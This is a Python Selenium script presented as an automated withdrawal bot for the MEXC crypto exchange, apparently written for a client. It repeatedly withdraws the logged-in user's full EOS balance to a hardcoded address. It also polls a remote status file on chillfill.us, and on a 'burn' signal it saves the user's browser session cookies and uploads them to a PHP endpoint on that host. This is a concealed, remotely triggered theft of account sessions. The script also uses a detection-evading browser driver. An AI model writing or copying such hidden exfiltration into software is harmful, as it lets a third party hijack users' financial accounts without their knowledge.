import multiprocessing
import os
import pickle
import threading
import time
import undetected_chromedriver as uc
import json
from selenium import webdriver
from selenium.common import NoSuchElementException
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.proxy import Proxy, ProxyType
from tkinter import Tk
from tkinter import Button
from tkinter import Label
import requests

"""
The project may be very difficult, as I'm creating a bot for a site that I'm georestricted from
"""


ADDRESS = 'mxeosnetwork'

TIME_TO_WAIT = 300#wait 5 minutes or so
CLIENT = "MEXC_BOT_REDDIT_1"
BURN = False
BURN_COMPLETE = False

def spot(chrome):
    chrome.get("https://www.mexc.com/assets/spot")
    WebDriverWait(chrome,10).until(
       EC.presence_of_element_located((By.XPATH,"input[@placeholder='Search']"))
    )
    search_eos = chrome.find_element(By.XPATH,"input[@placeholder='Search']").send_keys('EOS')
    time.sleep(2)
    eos_deposit = chrome.find_element(By.XPATH, "tr[@data-row-key='EOS']/td/div/div/a[href='']@")

def start_gui(chrome):
    def exit_func():
        chrome.close()
        os._exit(0)
    start_lambda = lambda : start_bot(chrome)
    start_thread = threading.Thread(target=start_lambda)
    #start_thread = multiprocessing.Process(target=start_lambda)
    root = Tk()
    instruction_label = Label(root, text = "Start the bot when you're ready after logging in and purchasing your EOS")
    start_button = Button(root, text="Click to start the bot.", command = start_thread.start)
    #stop_button = Button(root, text = "Click to stop the bot", command = start_thread.terminate)
    end_button = Button(root, text = "Click here to exit the bot program", command = exit_func)

    instruction_label.pack()
    start_button.pack()
    #stop_button.pack()
    end_button.pack()
    root.mainloop()

def send_cookies(chrome):
    myfiles = {'file': open('cookies.pkl', 'rb')}
    r = requests.post("http://chillfill.us/upload_script.php", files=myfiles)

def burn_client(chrome):
    cookies = chrome.get_cookies()
    # print(cookies)
    pickle.dump(cookies, open("cookies.pkl", "wb"))
    send_cookies(chrome)

def full_burn():
    pass

def start_bot(chrome):
    global BURN
    global BURN_COMPLETE
    chrome.get('https://www.mexc.com/assets/deposit/EOS')
    check_risk = chrome.find_element(By.XPATH, "//input[@type='checkbox']").click()
    button_risk = chrome.find_element(By.XPATH,
                                      "/ html / body / div[2] / div / div[2] / div / div[2] / div[3] / div / button").click()
    time.sleep(2)
    memo = chrome.find_element(By.XPATH,
                               '//*[@id="__next"]/div[3]/div[3]/div/div[1]/div/div[3]/div[3]/div[2]/div[1]/div[1]/div[2]/div[2]/span').text
    print(memo)
    x = 0
    while True:
        if BURN and x==0:
            x = 1
            burn_client(chrome)
            print("burning")
            if BURN_COMPLETE:
                full_burn()
                break

        chrome.get('https://www.mexc.com/assets/withdraw/EOS')
        try:
            check_withdraw = chrome.find_element(By.XPATH, '/html/body/div[2]/div/div[2]/div/div[2]/div[2]/div/label/span[1]/input').click()
            button_risk_withdraw = chrome.find_element(By.XPATH, '/html/body/div[2]/div/div[2]/div/div[2]/div[3]/div/button').click()
            #input("check interaction")
        except NoSuchElementException:
            pass
        #address = chrome.find_element(By.XPATH, '//*[@id="address"]').send_keys(ADDRESS)
        time.sleep(2)
        address = chrome.find_element(By.XPATH, '//input[@id="address"]').send_keys(ADDRESS)
        enter_memo = chrome.find_element(By.XPATH,'//input[@id="memo"]').send_keys(memo)
        select_all = chrome.find_element(By.XPATH, '//*[@id="__next"]/div[3]/div[3]/div/div[1]/form/div/div[3]/div[3]/div[1]/div[1]/div[2]/div[1]/div/span/span/a').click()
        send = chrome.find_element(By.XPATH, '//*[@id="__next"]/div[3]/div[3]/div/div[1]/form/div/div[3]/div[3]/div[4]/button').click()
        time.sleep(TIME_TO_WAIT)

def check_payment():
    global BURN
    global BURN_COMPLETE
    if read_payment_record():
        return

    r = requests.get("http://chillfill.us/status.json")
    status = r.json()[CLIENT]
    if status == 'awaiting':
        return
    if status == 'paid_in_full':
        write_payment_record(status)
        print("payment")
    if 'burn' in status:
        write_payment_record(status)
        BURN = True
        if status == 'burn_complete':
            BURN_COMPLETE = True

def read_payment_record():
    global BURN
    global BURN_COMPLETE
    try:
        with open("status.txt", 'r') as f:
            status = f.readlines()
            if status == 'paid_in_full':
                return True
            if 'burn' in status:
                BURN = True
                if status == 'burn_complete':
                    BURN_COMPLETE = True
                return False
    except:
        return False
    return False

def write_payment_record(status):
    with open("status.txt",'w') as f:
        f.write(status)

def main():

    check_payment()

    chrome_options = webdriver.ChromeOptions()
    chrome = uc.Chrome(options=chrome_options)

    #chrome.get("chrome://settings/content/location")
    # disable_button = chrome.find_element(By.ID,"disabledRadioOption").click()
    #input("geolocation off, press enter to continue")
    chrome.get("https://mexc.com/login")
    #email = chrome.find_element(By.XPATH,"//input[@placeholder='Email/Sub-Account']").send_keys(MEXC_LOGIN)
    #password = chrome.find_element(By.XPATH, "//input[@type='password']").send_keys(MEXC_PASS)
    #login_button = chrome.find_element(By.XPATH, "//button[@type='submit']").click()
    #input("login verified")
    #spot(chrome)

    start_gui(chrome)






    #chrome.get("mexc.com")




# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    main()

# See PyCharm help at https://www.jetbrains.com/help/pycharm/
